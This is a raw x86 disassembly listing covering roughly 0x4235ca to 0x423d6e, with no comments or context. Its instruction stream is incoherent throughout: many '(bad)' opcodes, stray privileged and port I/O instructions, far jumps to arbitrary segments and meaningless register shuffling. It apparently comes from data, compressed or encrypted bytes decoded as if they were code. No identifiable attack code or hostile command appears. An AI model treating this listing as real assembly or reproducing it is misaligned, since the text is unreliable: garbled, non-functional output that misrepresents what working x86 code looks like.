  4235ca:	mov    ch,0x12
  4235cc:	mov    fs,WORD PTR [eax-0x7f]
  4235cf:	loope  0x4235a1
  4235d1:	call   0xa64fedd7
  4235d6:	shl    BYTE PTR [ecx+0x539aa16e],1
  4235dc:	arpl   WORD PTR [eax],ax
  4235de:	rcl    DWORD PTR [eax-0x39],cl
  4235e1:	rcl    BYTE PTR [esi+0x3fcdd054],0xa6
  4235e8:	lock nop
  4235ea:	das    
  4235eb:	dec    ebp
  4235ec:	xor    al,dl
  4235ee:	xchg   esp,eax
  4235ef:	and    BYTE PTR [edx],al
  4235f1:	repnz xchg edi,eax
  4235f3:	test   al,0x27
  4235f5:	test   DWORD PTR [edx-0x2a72f67c],esi
  4235fb:	lahf   
  4235fc:	mov    ds:0x41ad6d64,eax
  423601:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423602:	cmc    
  423603:	push   0xa2c046ab
  423608:	(bad)  
  423609:	mov    ebp,0x1a04fea9
  42360e:	mov    ecx,0xc5f6d04c
  423613:	mov    edi,0x93934618
  423618:	call   0x3823fe88
  42361d:	pop    esi
  42361e:	cmp    eax,0x63b07d7e
  423623:	dec    edx
  423624:	pop    edi
  423625:	fist   DWORD PTR [edx+0x51]
  423628:	retf   0x9246
  42362b:	dec    ebx
  42362c:	cmp    DWORD PTR [ecx+0x73189886],esi
  423632:	cmp    al,0x4
  423634:	push   esp
  423635:	cmp    dh,dh
  423637:	fs xchg edx,eax
  423639:	mov    edx,0xccb474d2
  42363e:	ja     0x4235ca
  423640:	cmp    BYTE PTR [ebx],cl
  423642:	fistp  DWORD PTR ds:0x2d4f7d03
  423648:	pusha  
  423649:	mov    al,0xdd
  42364b:	jo     0x423686
  42364d:	xchg   esp,eax
  42364e:	shl    BYTE PTR [ebx+0x1c220059],1
  423654:	inc    eax
  423655:	xchg   ecx,edi
  423657:	pop    ebx
  423658:	xchg   ecx,eax
  423659:	or     DWORD PTR [edi+0x7b2a39c0],0xffffffb1
  423660:	aam    0x5f
  423662:	xor    bh,bh
  423664:	fwait
  423665:	xchg   esi,eax
  423666:	shr    BYTE PTR [ebx+0x6b6500b4],0x36
  42366d:	sbb    edi,DWORD PTR [edx-0x52b4b9bd]
  423673:	loop   0x4236ca
  423675:	mov    esp,0xce4930ee
  42367a:	dec    edi
  42367b:	dec    ecx
  42367c:	and    bl,BYTE PTR [edx]
  42367e:	aad    0xa9
  423680:	push   edi
  423681:	bound  ecx,QWORD PTR [edx]
  423683:	gs and cl,ch
  423686:	xchg   ebp,eax
  423687:	jae    0x42367d
  423689:	pusha  
  42368a:	jg     0x42360f
  42368c:	lea    ebx,[esi]
  42368e:	mov    ds:0x5abb3420,al
  423693:	div    BYTE PTR [eax+0x2d766a19]
  423699:	push   0xffffffae
  42369b:	scas   eax,DWORD PTR es:[edi]
  42369c:	cli    
  42369d:	push   esi
  42369e:	test   BYTE PTR [esi*4-0x3f4f6346],0xa5
  4236a6:	popf   
  4236a7:	bound  edi,QWORD PTR [edi-0x58]
  4236aa:	push   esp
  4236ab:	sbb    BYTE PTR [edx],0x54
  4236ae:	mov    eax,ds:0xe4a5eca6
  4236b3:	(bad)  
  4236b4:	les    eax,FWORD PTR gs:[ebp-0x2c]
  4236b8:	outs   dx,DWORD PTR ds:[esi]
  4236b9:	cmc    
  4236ba:	(bad)  
  4236bb:	rcl    DWORD PTR [edi],cl
  4236bd:	pop    ecx
  4236be:	(bad)  
  4236bf:	mov    dl,0x1d
  4236c1:	icebp  
  4236c2:	ret    
  4236c3:	enter  0x11ef,0xb7
  4236c7:	push   ebx
  4236c8:	fdiv   DWORD PTR [edx]
  4236ca:	jno    0x423654
  4236cc:	das    
  4236cd:	(bad)  
  4236d1:	stos   BYTE PTR es:[edi],al
  4236d2:	cli    
  4236d3:	jns    0x4236a5
  4236d5:	sub    dl,al
  4236d7:	stc    
  4236d8:	sub    BYTE PTR [edx],dl
  4236da:	mov    WORD PTR [edx-0x4ed9d7bb],fs
  4236e0:	outs   dx,DWORD PTR ds:[esi]
  4236e1:	xor    bh,bh
  4236e3:	dec    eax
  4236e4:	and    BYTE PTR [ebp+0x692351e0],bh
  4236ea:	test   DWORD PTR [eax+eiz*2+0x6223f02d],esp
  4236f1:	push   ebp
  4236f2:	les    edx,FWORD PTR [eax]
  4236f4:	adc    bh,dh
  4236f6:	cmp    eax,0xab1cc3ec
  4236fb:	adc    ebx,DWORD PTR [ebx+0x104810fa]
  423701:	ret    
  423702:	cli    
  423703:	xchg   ebx,eax
  423704:	add    al,0x44
  423706:	int3   
  423707:	iret   
  423708:	bound  ebx,QWORD PTR [ecx+ecx*8-0x4c]
  42370c:	stc    
  42370d:	mov    ah,al
  42370f:	and    al,0x3b
  423711:	fist   WORD PTR [edx]
  423713:	jmp    0x4236af
  423715:	jae    0x4236aa
  423717:	add    edi,DWORD PTR [edi-0x4c]
  42371a:	xor    edi,ecx
  42371c:	mov    BYTE PTR [edx-0x65ee21b],dh
  423722:	xor    BYTE PTR [ebx+eiz*8-0x6b],dl
  423726:	dec    ecx
  423728:	les    ebp,FWORD PTR [ebx+0x611e2600]
  42372e:	inc    ecx
  42372f:	lods   al,BYTE PTR ds:[esi]
  423730:	or     ebp,edi
  423732:	sti    
  423733:	sbb    edi,esi
  423735:	in     eax,0xc1
  423737:	and    al,0xdb
  423739:	dec    ecx
  42373a:	jg     0x42371b
  42373c:	sub    bh,BYTE PTR [edi+eiz*4-0x7b]
  423740:	cmc    
  423741:	(bad)  
  423743:	xor    eax,0x78046e22
  423748:	push   ebx
  423749:	or     dh,dh
  42374b:	mov    bh,0xf1
  42374d:	frstor [ecx-0x2a]
  423750:	push   edx
  423751:	sub    al,0xb7
  423753:	mov    ch,0x90
  423755:	test   bh,al
  423757:	and    ebx,DWORD PTR [eax+ecx*2]
  42375a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42375b:	add    ebp,DWORD PTR [edi+0x10]
  42375e:	ja     0x423787
  423760:	test   BYTE PTR [edx+0x0],ah
  423763:	xchg   ecx,eax
  423764:	scas   eax,DWORD PTR es:[edi]
  423765:	lahf   
  423766:	daa    
  423767:	das    
  423768:	or     edx,DWORD PTR [ebp-0x5b]
  42376b:	cmp    DWORD PTR [ebp-0x75],ecx
  42376e:	sub    eax,0x12cdb733
  423773:	daa    
  423774:	adc    dh,al
  423776:	test   edi,esi
  423778:	jbe    0x42371a
  42377a:	pushf  
  42377b:	test   eax,0xb0a37adc
  423780:	adc    DWORD PTR [ebp-0x43],eax
  423783:	jno    0x423784
  423785:	aad    0xee
  423787:	mov    bh,0xaa
  423789:	pop    ss
  42378a:	sahf   
  42378b:	arpl   bx,dx
  42378d:	fisttp WORD PTR [ebx-0x476872dc]
  423793:	push   cs
  423794:	mov    BYTE PTR ds:[ebx-0x73],al
  423798:	jmp    0x423804
  42379a:	mov    edi,0x7e0c6d36
  42379f:	mov    dh,0x79
  4237a1:	fdiv   st,st(1)
  4237a3:	xchg   esp,eax
  4237a4:	sub    al,0xd3
  4237a6:	push   eax
  4237a7:	lahf   
  4237a8:	cmp    edx,DWORD PTR [ecx+0x7b]
  4237ab:	inc    edx
  4237ac:	cmp    al,0xe8
  4237ae:	imul   edx,DWORD PTR [ebp-0xf427268],0x905bac00
  4237b8:	xor    al,0xd8
  4237ba:	push   ebx
  4237bb:	in     eax,0x20
  4237bd:	dec    edx
  4237be:	fdivr  st,st(2)
  4237c0:	(bad)  
  4237c1:	(bad)  [esi-0x2d]
  4237c4:	ror    edx,1
  4237c6:	xchg   esi,eax
  4237c7:	in     eax,0xd7
  4237c9:	pop    ss
  4237ca:	(bad)  
  4237cb:	mov    eax,0x9c59aa53
  4237d0:	push   esi
  4237d1:	jge    0x423847
  4237d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237d4:	cmp    ecx,DWORD PTR [ecx+0x3b3ba148]
  4237da:	push   ebx
  4237db:	fmul   DWORD PTR [edi-0x6a]
  4237de:	scas   eax,DWORD PTR es:[edi]
  4237df:	fisttp QWORD PTR [edi-0x6b0f46de]
  4237e5:	inc    edx
  4237e6:	jnp    0x42383c
  4237e8:	test   BYTE PTR [edx-0xf],0x8f
  4237ec:	std    
  4237ed:	fldenv ds:0x5b8448bb
  4237f3:	out    0xeb,al
  4237f5:	sbb    edi,eax
  4237f7:	mov    cl,0xf8
  4237f9:	ret    0xeefc
  4237fc:	lock aam 0xf
  4237ff:	leave  
  423800:	sti    
  423801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423802:	inc    ebx
  423803:	aad    0x7e
  423805:	cmp    al,0x9d
  423807:	inc    edi
  423808:	inc    dh
  42380a:	inc    eax
  42380b:	ja     0x4237e7
  42380d:	(bad)  [eax]
  42380f:	int    0xb8
  423811:	xor    ebx,esp
  423813:	sub    eax,0xc0d53d1
  423818:	mov    fs,WORD PTR [ebx+0x64572e23]
  42381e:	cld    
  42381f:	rcl    DWORD PTR [esi+0x18bb678a],0x8
  423826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423827:	pop    ds
  423828:	xor    DWORD PTR [eax+esi*4+0x19c7d287],ebp
  42382f:	jb     0x423814
  423831:	lods   eax,DWORD PTR ds:[esi]
  423832:	out    dx,al
  423833:	lar    edx,WORD PTR ds:0xadae7beb
  42383a:	dec    esi
  42383b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42383c:	cdq    
  42383d:	out    0x97,eax
  42383f:	jmp    0x76afd4ce
  423844:	dec    edi
  423845:	mov    dh,0x47
  423847:	aaa    
  423848:	mov    dh,0xa7
  42384a:	mov    dh,BYTE PTR [eax+0x3b12fe8a]
  423850:	mov    ah,0xad
  423852:	and    ecx,0xb3513bc2
  423858:	mov    eax,ds:0xc3bbfcbd
  42385d:	fld    TBYTE PTR [edx+0x2f04fc3d]
  423863:	adc    eax,0x4a9d7086
  423868:	push   ebx
  423869:	xor    edi,edi
  42386b:	xchg   esp,eax
  42386c:	xor    eax,0x778e912a
  423871:	or     al,0xf6
  423873:	jecxz  0x4238bc
  423875:	cmp    eax,DWORD PTR ds:0x47c47cef
  42387b:	sbb    ecx,ebx
  42387d:	int    0x8a
  42387f:	retf   
  423880:	add    bh,BYTE PTR [edi]
  423882:	jmp    0x52e17da7
  423887:	pop    ebx
  423888:	ss mov bl,0x52
  42388b:	in     eax,dx
  42388c:	nop
  42388d:	push   ds
  42388e:	mov    ah,0xd0
  423890:	jb     0x42387c
  423892:	xchg   DWORD PTR [ebx+0x1],esi
  423895:	mov    ebp,DWORD PTR [ebx]
  423897:	cmp    cl,BYTE PTR [ebx+0x76ab5ab6]
  42389d:	or     DWORD PTR [ebp+edx*1+0x87ba2c0],0xffffffe6
  4238a5:	dec    ebx
  4238a6:	adc    ah,0xfc
  4238a9:	mov    ds:0xa000d60a,eax
  4238ae:	cmc    
  4238af:	test   al,0xef
  4238b1:	not    bl
  4238b3:	pop    esp
  4238b4:	int    0xdc
  4238b6:	or     ah,BYTE PTR [ebx-0x1c]
  4238b9:	dec    ebx
  4238ba:	mov    bl,BYTE PTR [eax+0x7f92804f]
  4238c0:	clc    
  4238c1:	fdivr  DWORD PTR [edx+0x23187f9a]
  4238c8:	popf   
  4238c9:	or     ebp,DWORD PTR [eax-0x65eb96d1]
  4238cf:	stos   DWORD PTR es:[edi],eax
  4238d0:	cwde   
  4238d1:	jmp    0xdc59:0xdc16f431
  4238d8:	les    ecx,FWORD PTR [ebx]
  4238da:	imul   ebp,ebp,0xdbb99dbd
  4238e0:	(bad)  
  4238e2:	(bad)  
  4238e3:	sub    ecx,ebp
  4238e5:	jle    0x423931
  4238e7:	inc    ecx
  4238e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238e9:	dec    ebp
  4238ea:	push   ds
  4238eb:	jnp    0x4238f7
  4238ed:	icebp  
  4238ee:	ins    DWORD PTR es:[edi],dx
  4238ef:	sbb    DWORD PTR [ebx],esi
  4238f1:	inc    eax
  4238f2:	lods   al,BYTE PTR ds:[esi]
  4238f3:	sar    DWORD PTR [eax-0x8300b42],1
  4238f9:	fnop   
  4238fb:	mov    dh,0xba
  4238fd:	mov    DWORD PTR [ecx-0x30],esi
  423900:	pop    ds
  423901:	dec    edx
  423902:	ss jg  0x423950
  423905:	fdivr  QWORD PTR [edx+0x7957313e]
  42390b:	jns    0x423918
  42390d:	sub    al,0x30
  42390f:	nop
  423910:	push   0x1d542298
  423915:	xchg   ecx,edx
  423917:	fs cs ins DWORD PTR es:[edi],dx
  42391a:	mov    bl,0xb1
  42391c:	(bad)  
  42391d:	jns    0x423901
  42391f:	cmp    BYTE PTR [ebx],al
  423921:	sbb    al,0xbc
  423923:	push   0xffffffec
  423925:	enter  0x29cb,0x2f
  423929:	jb     0x42398c
  42392b:	sbb    al,0x33
  42392d:	popa   
  42392e:	(bad)  
  42392f:	lock mov esp,DWORD PTR [ebx+0x60940c7d]
  423936:	jbe    0x423950
  423938:	inc    esp
  423939:	pushf  
  42393a:	or     eax,0xf5e31ddf
  42393f:	test   DWORD PTR [edx+0x6c2f2d87],0x8c3c01ec
  423949:	mov    bl,0xd
  42394b:	hlt    
  42394c:	outs   dx,BYTE PTR ds:[esi]
  42394d:	mov    ch,0xb6
  42394f:	or     DWORD PTR [ecx],edx
  423951:	cmp    BYTE PTR [esi-0x34],0x72
  423955:	hlt    
  423956:	lea    eax,[edx]
  423958:	sbb    dl,dl
  42395a:	jecxz  0x423906
  42395c:	mov    ebx,0xfe5eead6
  423961:	pop    ecx
  423962:	scas   eax,DWORD PTR es:[edi]
  423963:	iret   
  423964:	adc    DWORD PTR ds:0x243f69da,0xf7307f4e
  42396e:	sub    edi,DWORD PTR [esi+0x34]
  423971:	cmc    
  423972:	aas    
  423973:	cmc    
  423974:	push   ss
  423975:	nop
  423976:	hlt    
  423977:	aad    0x91
  423979:	cmp    eax,0xd6dc3cd7
  42397e:	sub    BYTE PTR [edi-0x75],al
  423981:	xchg   edx,eax
  423982:	xor    al,0x5a
  423984:	adc    ebp,edi
  423986:	mov    DWORD PTR [edx-0x7815c22d],esp
  42398c:	in     eax,dx
  42398d:	fimul  DWORD PTR [ebp+0x5a00218d]
  423993:	mov    gs,WORD PTR [edi-0x29e44d6f]
  423999:	mov    edx,0x3b96998c
  42399e:	arpl   si,ax
  4239a0:	dec    edx
  4239a1:	out    dx,al
  4239a2:	in     eax,0x72
  4239a4:	pop    eax
  4239a5:	push   cs
  4239a6:	lock jne 0x4239fe
  4239a9:	jo     0x423a06
  4239ab:	xchg   DWORD PTR [eax+0x28],ecx
  4239ae:	inc    eax
  4239af:	ret    0xa17f
  4239b2:	xchg   esi,eax
  4239b3:	add    ebx,edi
  4239b5:	mov    esp,0x9c535d33
  4239ba:	mov    ebp,0x70e32c3c
  4239bf:	inc    ebp
  4239c0:	nop
  4239c1:	lods   al,BYTE PTR ds:[esi]
  4239c2:	es jb  0x423956
  4239c5:	or     DWORD PTR [ecx-0x54],ecx
  4239c8:	xchg   ebp,eax
  4239c9:	sub    eax,0x398d7aaf
  4239ce:	dec    ebp
  4239cf:	test   DWORD PTR [edx],ebx
  4239d1:	mov    dl,0xd5
  4239d3:	ds add al,0xf8
  4239d6:	test   eax,0xa0a1b87c
  4239db:	sub    al,0xda
  4239dd:	sub    ebx,DWORD PTR [eax]
  4239df:	nop
  4239e0:	(bad)  
  4239e1:	xor    eax,0x95f17388
  4239e6:	cmp    DWORD PTR [edi+0x69],esp
  4239e9:	xlat   BYTE PTR ds:[ebx]
  4239ea:	fs fwait
  4239ec:	sub    BYTE PTR [eax+0x1b],al
  4239ef:	adc    ecx,0xa957c107
  4239f5:	out    0x3f,eax
  4239f7:	inc    ebx
  4239f8:	je     0x423a24
  4239fa:	jecxz  0x423a34
  4239fc:	fidivr DWORD PTR [edx-0x3f3c6113]
  423a02:	dec    edx
  423a03:	push   esp
  423a04:	xchg   esi,eax
  423a05:	test   BYTE PTR [edx+0x1b],0x2e
  423a09:	adc    al,0x68
  423a0b:	pop    esi
  423a0c:	push   edx
  423a0d:	jle    0x423a27
  423a0f:	out    0x27,al
  423a11:	test   al,0xe2
  423a13:	push   edx
  423a14:	cmp    al,0x7b
  423a16:	dec    BYTE PTR [ebx+0x5f]
  423a19:	push   0xfffffff0
  423a1b:	fmul   QWORD PTR [ecx+0x8]
  423a1e:	dec    ebx
  423a1f:	inc    ecx
  423a20:	mov    gs,WORD PTR [esp+edi*4+0x3e4e6088]
  423a27:	mov    dl,BYTE PTR [ecx+edi*1+0x1e]
  423a2b:	jecxz  0x4239bf
  423a2d:	xor    BYTE PTR [edi+0x3c27da72],ah
  423a33:	add    BYTE PTR [ebp+0xf],ch
  423a36:	jnp    0x423a5c
  423a38:	imul   esp,DWORD PTR [edi-0x489e6914],0x46
  423a3f:	hlt    
  423a40:	push   esp
  423a41:	adc    al,0xe5
  423a43:	aas    
  423a44:	inc    esp
  423a45:	int3   
  423a46:	dec    ecx
  423a47:	mov    fs,WORD PTR [ecx-0x46197293]
  423a4d:	add    bl,BYTE PTR [edi+0x4]
  423a50:	in     al,dx
  423a51:	pop    es
  423a52:	sbb    cl,dh
  423a54:	int    0x44
  423a56:	jae    0x4239da
  423a58:	popf   
  423a59:	retf   
  423a5a:	jbe    0x423ace
  423a5c:	push   edi
  423a5d:	fist   WORD PTR [eax]
  423a5f:	loope  0x423a65
  423a61:	fld    DWORD PTR [edx]
  423a63:	lea    edi,[ecx+0x61]
  423a66:	push   0xd9e8bc08
  423a6b:	push   esi
  423a6c:	cmp    BYTE PTR [ecx+esi*4],0xe5
  423a70:	jne    0x423a1c
  423a72:	imul   ebp,DWORD PTR [ebp+0x64],0xfffffff5
  423a76:	iret   
  423a77:	fmul   st,st(3)
  423a79:	stc    
  423a7a:	mov    eax,0x7ead2802
  423a7f:	test   al,0xc3
  423a81:	ficomp WORD PTR [ecx]
  423a83:	push   cs
  423a84:	jae    0x423abc
  423a86:	mov    al,0x46
  423a88:	mov    ds:0xc455c0f8,al
  423a8d:	cmp    esi,DWORD PTR [ebp-0x54]
  423a90:	add    dh,BYTE PTR [edx-0x1ca67576]
  423a96:	fs std 
  423a98:	sti    
  423a99:	aam    0x38
  423a9b:	or     BYTE PTR [edx-0x10efa4e7],bh
  423aa1:	push   edi
  423aa2:	loopne 0x423aa3
  423aa4:	jg     0x423b21
  423aa6:	test   dl,ah
  423aa8:	clc    
  423aa9:	ret    
  423aaa:	stos   DWORD PTR es:[edi],eax
  423aab:	push   edi
  423aac:	clc    
  423aad:	inc    BYTE PTR [ebx]
  423aaf:	inc    ebx
  423ab0:	xlat   BYTE PTR ds:[ebx]
  423ab1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ab2:	gs inc eax
  423ab4:	fsub   DWORD PTR [ecx+0x3175e3b3]
  423aba:	inc    esp
  423abb:	push   esi
  423abc:	jae    0x423ae0
  423abe:	mov    DWORD PTR [eax+edx*2+0x32],0xa9aca099
  423ac6:	sti    
  423ac7:	js     0x423ad1
  423ac9:	push   0x17ba6c16
  423ace:	xor    esi,DWORD PTR [ebx]
  423ad0:	and    DWORD PTR [ebx+edi*2],eax
  423ad3:	and    eax,0x1d4a8f87
  423ad8:	sub    dh,BYTE PTR [ebp+0x6e]
  423adb:	jno    0x423b58
  423add:	out    dx,eax
  423ade:	sar    dl,cl
  423ae0:	mov    dl,0x33
  423ae2:	mul    al
  423ae4:	shl    DWORD PTR [ebp+0x585b9c09],0x3f
  423aeb:	jg     0x423b14
  423aed:	sub    esp,DWORD PTR [edx+0x73]
  423af0:	xor    DWORD PTR [ebx],edx
  423af2:	sub    eax,0x61739af9
  423af7:	retf   
  423af8:	add    edi,ecx
  423afa:	(bad)
  423afe:	mov    ebx,0x9aa2c03
  423b03:	data16 fdiv DWORD PTR [ecx]
  423b06:	test   BYTE PTR [edi-0x4],0x1b
  423b0a:	or     eax,0xb2af5cee
  423b0f:	frstor [ecx-0x33]
  423b12:	cli    
  423b13:	mov    al,0xe8
  423b15:	dec    esi
  423b16:	or     ah,BYTE PTR [ebx]
  423b18:	test   esi,0xc9814fe7
  423b1e:	mul    eax
  423b20:	cdq    
  423b21:	push   edi
  423b22:	sbb    DWORD PTR [esi+0x7dafb13b],ebx
  423b28:	repz mov edx,0xb60cab6
  423b2e:	adc    DWORD PTR ds:0x330d3cbc,esi
  423b34:	gs stos BYTE PTR es:[edi],al
  423b36:	mov    WORD PTR ds:[esi-0x57],ds
  423b3a:	mov    dl,0x50
  423b3c:	mul    BYTE PTR [eax+ecx*4]
  423b3f:	jge    0x423b49
  423b41:	adc    bh,dh
  423b43:	arpl   WORD PTR [edx],bx
  423b45:	in     al,0x77
  423b47:	je     0x423b6b
  423b49:	div    cl
  423b4b:	rcr    DWORD PTR [ebp-0x3a],0xc4
  423b4f:	and    DWORD PTR [ecx-0x59],ebp
  423b52:	inc    esp
  423b53:	mov    ch,BYTE PTR [esi-0x1d]
  423b56:	fnstcw WORD PTR [esi]
  423b58:	mov    eax,0x4454f839
  423b5d:	push   esi
  423b5e:	(bad)  
  423b5f:	std    
  423b60:	xchg   DWORD PTR ds:0x28bc8694,edi
  423b66:	pop    eax
  423b67:	inc    eax
  423b68:	cmp    cl,BYTE PTR [ecx+0x4a975e14]
  423b6e:	iret   
  423b6f:	mov    dh,ch
  423b71:	xlat   BYTE PTR fs:[ebx]
  423b73:	cld    
  423b74:	rcr    dh,0x68
  423b77:	xchg   BYTE PTR [edx+0x36],al
  423b7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b7b:	jbe    0x423b40
  423b7d:	jmp    0x1f73:0xae9fca1a
  423b84:	pushf  
  423b85:	fistp  WORD PTR ds:0xcd55ece8
  423b8b:	mov    dh,0xe7
  423b8d:	cli    
  423b8e:	pusha  
  423b8f:	jne    0x423b59
  423b91:	inc    esp
  423b92:	mov    ?,WORD PTR [ebx]
  423b94:	pop    edx
  423b95:	pop    ecx
  423b96:	xchg   BYTE PTR [edi+ebx*8-0x38ec173],dh
  423b9d:	ins    DWORD PTR es:[edi],dx
  423b9e:	rcr    DWORD PTR [edx-0x6db50834],cl
  423ba4:	xchg   edx,eax
  423ba5:	cmp    BYTE PTR [ecx],ah
  423ba7:	push   es
  423ba8:	sub    BYTE PTR [ebp+0x3],0xa
  423bac:	aad    0x16
  423bae:	sbb    ah,al
  423bb0:	xchg   esp,eax
  423bb1:	sti    
  423bb2:	pushf  
  423bb3:	push   0xffffff97
  423bb5:	xor    al,dl
  423bb7:	sub    eax,esp
  423bb9:	in     eax,dx
  423bba:	add    al,0xd6
  423bbc:	stos   BYTE PTR es:[edi],al
  423bbd:	stc    
  423bbe:	add    DWORD PTR [ecx-0x80],eax
  423bc1:	dec    esp
  423bc2:	pop    ebp
  423bc3:	inc    edi
  423bc4:	retf   
  423bc5:	cmp    ch,BYTE PTR [ecx]
  423bc7:	out    0x38,eax
  423bc9:	cli    
  423bca:	mov    esp,0xeb0eaafd
  423bcf:	and    eax,0xd244e86f
  423bd4:	push   cs
  423bd5:	mov    WORD PTR [ecx-0x3d95717d],cs
  423bdb:	stos   DWORD PTR es:[edi],eax
  423bdc:	shl    ah,1
  423bde:	hlt    
  423bdf:	scas   eax,DWORD PTR es:[edi]
  423be0:	repnz add BYTE PTR [eax-0x4],dl
  423be4:	xor    BYTE PTR [esi],0x41
  423be7:	(bad)  
  423be8:	in     al,0xae
  423bea:	push   es
  423beb:	hlt    
  423bec:	jmp    0x2933:0x8a4fef08
  423bf3:	(bad)  
  423bf4:	mov    cx,0x7298
  423bf8:	or     eax,0xe8f66bdf
  423bfd:	adc    DWORD PTR [si+0x41],0x33462952
  423c05:	xchg   esp,eax
  423c06:	sbb    ebp,DWORD PTR [ebx+0x594f43a4]
  423c0c:	jae    0x423bc3
  423c0e:	jbe    0x423bf7
  423c10:	outs   dx,DWORD PTR ds:[esi]
  423c11:	aam    0xb4
  423c13:	mov    al,0xb6
  423c15:	fidivr DWORD PTR ds:0x5e65eda6
  423c1b:	out    dx,al
  423c1c:	mov    ecx,DWORD PTR [ecx+0x1a73976e]
  423c22:	retf   0xda20
  423c25:	dec    ebp
  423c26:	xor    DWORD PTR [ebx+0x35ca6dd4],0x9
  423c2d:	jbe    0x423c9c
  423c2f:	pop    esi
  423c30:	sar    dl,1
  423c32:	jle    0x423c4b
  423c34:	int3   
  423c35:	leave  
  423c36:	sbb    al,0x81
  423c38:	push   ss
  423c39:	cmp    bh,BYTE PTR [eax+edi*4-0x1c]
  423c3d:	mov    cl,0x62
  423c3f:	sub    edx,DWORD PTR [esi*1+0x28617aeb]
  423c46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c47:	fiadd  DWORD PTR [ecx+0x1969fdf9]
  423c4d:	aas    
  423c4e:	int3   
  423c4f:	and    eax,0x630b907b
  423c54:	or     DWORD PTR [ebp-0x50],ebp
  423c57:	(bad)  
  423c58:	loopne 0x423c86
  423c5a:	push   0x36
  423c5c:	(bad)  
  423c5d:	pop    ds
  423c5e:	jp     0x423c68
  423c60:	pop    ebp
  423c61:	sbb    bh,dh
  423c63:	cmc    
  423c64:	int    0xe3
  423c66:	xchg   ebx,eax
  423c67:	loope  0x423cdc
  423c69:	xchg   ebx,eax
  423c6a:	aaa    
  423c6b:	cli    
  423c6c:	push   edx
  423c6d:	aad    0x9f
  423c6f:	int3   
  423c70:	fmul   st(1),st
  423c72:	fwait
  423c73:	mov    ?,WORD PTR [ecx+0x56]
  423c76:	sbb    al,0x42
  423c78:	stos   DWORD PTR es:[edi],eax
  423c79:	out    0xa3,al
  423c7b:	loop   0x423c81
  423c7d:	rcr    BYTE PTR [ebp+edi*8+0x45],cl
  423c81:	mov    ecx,DWORD PTR [ebx-0x3a23c6bb]
  423c87:	fadd   DWORD PTR [ebx]
  423c89:	stos   BYTE PTR es:[edi],al
  423c8a:	(bad)  
  423c8b:	adc    DWORD PTR [ecx],edi
  423c8d:	hlt    
  423c8e:	mov    bh,0x65
  423c90:	or     DWORD PTR [ebx+0x1d],0x44
  423c94:	push   es
  423c95:	mov    dl,0x84
  423c97:	ror    DWORD PTR [eax-0x2e],0x19
  423c9b:	mov    ch,dl
  423c9d:	sub    al,0x3b
  423c9f:	mov    bl,0x9
  423ca1:	mov    edi,0x6d3309af
  423ca6:	std    
  423ca7:	(bad)  
  423ca8:	push   esi
  423ca9:	scas   eax,DWORD PTR es:[edi]
  423caa:	cmp    BYTE PTR [edx],ch
  423cac:	loop   0x423c8c
  423cae:	stos   BYTE PTR es:[edi],al
  423caf:	call   0xc174:0x65400f17
  423cb6:	lock xor eax,0x7842ff0b
  423cbc:	clc    
  423cbd:	je     0x423c5a
  423cbf:	nop
  423cc0:	cmc    
  423cc1:	rcl    BYTE PTR [edi-0x1c],1
  423cc4:	add    DWORD PTR [ecx],esp
  423cc6:	ret    
  423cc7:	outs   dx,DWORD PTR ds:[esi]
  423cc8:	adc    eax,0x4c3c173c
  423ccd:	push   0xec508ac5
  423cd2:	and    cx,si
  423cd5:	push   ebx
  423cd6:	repz sbb ch,dh
  423cd9:	push   ecx
  423cda:	popa   
  423cdb:	xor    eax,0x68576344
  423ce0:	xchg   ebx,eax
  423ce1:	jne    0x423c92
  423ce3:	sbb    eax,0x1aa40f88
  423ce8:	mov    WORD PTR [esi],es
  423cea:	xor    BYTE PTR [ebp-0x1a],bl
  423ced:	xor    edi,DWORD PTR [edx-0x62]
  423cf0:	iret   
  423cf1:	sbb    al,0xfa
  423cf3:	pop    ecx
  423cf4:	push   edi
  423cf5:	sub    ecx,DWORD PTR [eax-0x71cc0928]
  423cfb:	loop   0x423c7f
  423cfd:	cdq    
  423cfe:	lea    esi,gs:[esi+0x1a]
  423d02:	pop    ds
  423d03:	adc    BYTE PTR [ebx],ch
  423d05:	sbb    eax,0x14bc4420
  423d0a:	stos   DWORD PTR es:[edi],eax
  423d0b:	dec    ebx
  423d0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d0d:	jo     0x423d5c
  423d0f:	cmp    al,0xd
  423d11:	jg     0x423d72
  423d13:	repz dec edi
  423d15:	push   edx
  423d16:	pop    ebp
  423d17:	xchg   esp,eax
  423d18:	test   BYTE PTR [eax-0x1b],dh
  423d1b:	cld    
  423d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d1d:	fld    st(4)
  423d1f:	js     0x423cbd
  423d21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d22:	push   DWORD PTR ds:[eax+ebx*2-0x57c80bfa]
  423d2a:	xor    al,0x30
  423d2c:	jnp    0x423d3a
  423d2e:	mov    bl,0xb3
  423d30:	push   edx
  423d31:	inc    eax
  423d32:	mov    esp,0xa17e6031
  423d37:	dec    esp
  423d38:	adc    eax,DWORD PTR [ebx+esi*2-0x1e68f2b0]
  423d3f:	stc    
  423d40:	lods   al,BYTE PTR ds:[esi]
  423d41:	ret    0x4d3a
  423d44:	das    
  423d45:	jnp    0x423d45
  423d47:	pop    es
  423d48:	adc    ch,dh
  423d4a:	mov    DWORD PTR [edi+0x732982eb],ebx
  423d50:	pop    es
  423d51:	or     BYTE PTR [ebp+0x7f2bfe3e],bl
  423d57:	cmc    
  423d58:	aam    0x2f
  423d5a:	cmp    al,0x42
  423d5c:	xor    bl,BYTE PTR [edi]
  423d5e:	(bad)  
  423d5f:	sbb    al,0x48
  423d61:	icebp  
  423d62:	addr16 out dx,al
  423d64:	and    cl,BYTE PTR [edi+0x78cf12c9]
  423d6a:	stc    
  423d6b:	xlat   BYTE PTR ds:[ebx]
  423d6c:	retf   
  423d6d:	(bad)  
  423d6e:	xlat   BYTE PTR ds:[bx]
